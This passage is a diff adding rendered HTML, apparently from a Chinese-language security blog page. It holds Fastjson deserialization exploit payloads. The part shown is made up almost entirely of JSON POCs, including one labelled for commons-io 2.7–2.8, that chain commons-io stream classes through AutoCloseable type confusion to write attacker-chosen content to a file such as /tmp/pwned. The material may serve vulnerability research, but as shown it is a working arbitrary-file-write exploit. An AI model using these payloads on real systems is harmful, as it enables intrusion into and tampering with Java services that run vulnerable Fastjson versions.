+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger2&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger3&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;is&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.7-2.8版本POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;x&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.alibaba.fastjson.JSONObject&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.ReaderInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;reader&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.CharSequenceReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charSequence&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.String&#34;&#34;aaaaaa...(长度要大于8192，实际写入前8192个字符)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;start&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;end&#34;</span><span class="p">:</span> <span class="mi">2147483647</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;bufferSize&#34;</span><span class="p">:</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.output.WriterOutputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;writer&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.output.FileWriterWithEncoding&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;file&#34;</span><span class="p">:</span> <span class="s2">&#34;/tmp/pwned&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;append&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;charsetName&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;bufferSize&#34;</span><span class="p">:</span> <span class="mi">1024</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;writeImmediately&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;inputStream&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger2&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;inputStream&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;trigger3&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.AutoCloseable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.XmlStreamReader&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;inputStream&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.commons.io.input.TeeInputStream&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;input&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.input&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;branch&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.branch&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&#34;closeBranch&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">                <span class="p">},</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;httpContentType&#34;</span><span class="p">:</span> <span class="s2">&#34;text/xml&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;lenient&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&#34;defaultEncoding&#34;</span><span class="p">:</span> <span class="s2">&#34;UTF-8&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
